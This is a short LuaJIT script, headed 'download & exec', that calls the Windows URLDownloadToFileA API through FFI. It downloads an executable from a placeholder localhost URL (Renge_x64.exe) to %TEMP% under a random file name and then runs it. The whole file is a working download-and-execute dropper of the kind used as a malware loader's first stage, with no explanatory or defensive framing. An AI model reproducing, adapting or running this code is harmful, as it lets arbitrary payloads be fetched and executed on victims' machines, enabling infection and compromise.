-- download & exec
-- takes a url e.g. http://127.0.0.1/Renge_x64.exe" and executes it.
local ffi = require("ffi")

-- Define the URLDownloadToFile function prototype
ffi.cdef[[
    typedef int HRESULT;
    HRESULT URLDownloadToFileA(
        void* pCaller,
        const char* szURL,
        const char* szFileName,
        unsigned long dwReserved,
        void* lpfnCB
    );
    void Sleep(unsigned long dwMilliseconds);
]]

-- Load the urlmon.dll library
local urlmon = ffi.load("urlmon")

-- Define the URL and file path
local url = "http://127.0.0.1/Renge_x64.exe"

-- Function to generate random string
function generateRandomString(length)
    local charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    local str = ""
    math.randomseed(os.time())
    for _ = 1, length do
        local randomIndex = math.random(1, #charset)
        str = str .. charset:sub(randomIndex, randomIndex)
    end
    return str
end

-- Generate a random file name with a .exe extension in the %TEMP% directory
local tempDir = os.getenv("TEMP") or os.getenv("TMP") or "C:\\Temp"
local localPath = tempDir .. "\\" .. generateRandomString(8) .. ".exe"

-- Use URLDownloadToFile to download the file
local result = urlmon.URLDownloadToFileA(nil, url, localPath, 0, nil)

if result == 0 then
    print("File downloaded successfully.")

    -- Sleep for a moment to ensure the file is completely written
    ffi.C.Sleep(1000)

    -- Now, let's execute the downloaded file
    local success, exitCode = os.execute(localPath)

    if success then
        print("Executable ran successfully. Exit code: " .. exitCode)
    else
        print("Failed to run the executable.")
    end
else
    print("Failed to download the file. Error code: " .. result)
end